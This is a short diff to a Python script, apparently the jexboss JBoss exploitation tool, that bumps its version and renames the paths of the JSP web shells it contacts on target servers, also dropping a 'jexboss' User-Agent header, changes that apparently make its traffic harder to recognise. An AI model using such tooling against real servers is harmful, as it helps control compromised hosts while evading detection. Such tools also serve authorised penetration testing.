@@ -28,7 +28,7 @@ NORMAL = '\033[0m'
 ENDC = '\033[0m'
 
 __author__ = "João Filho Matos Figueiredo <joaomatosf@gmail.com>"
-__version = "1.0.5"
+__version = "1.0.6"
 
 from sys import argv, exit, version_info
 from _exploits import *
@@ -173,10 +173,9 @@ def shell_http(url, shell_type):
                "User-Agent": user_agents[randint(0, len(user_agents) - 1)]}
 
     if shell_type == "jmx-console" or shell_type == "web-console":
-        path = '/jbossass/jbossass.jsp?'
+        path = '/jexws/jexws.jsp?'
     elif shell_type == "JMXInvokerServlet":
-        path = '/shellinvoker/shellinvoker.jsp?'
-        headers['User-Agent'] = "jexboss"
+        path = '/jexinv/jexinv.jsp?'
 
     pool.request('GET', url+ path, redirect=False, headers=headers)
 
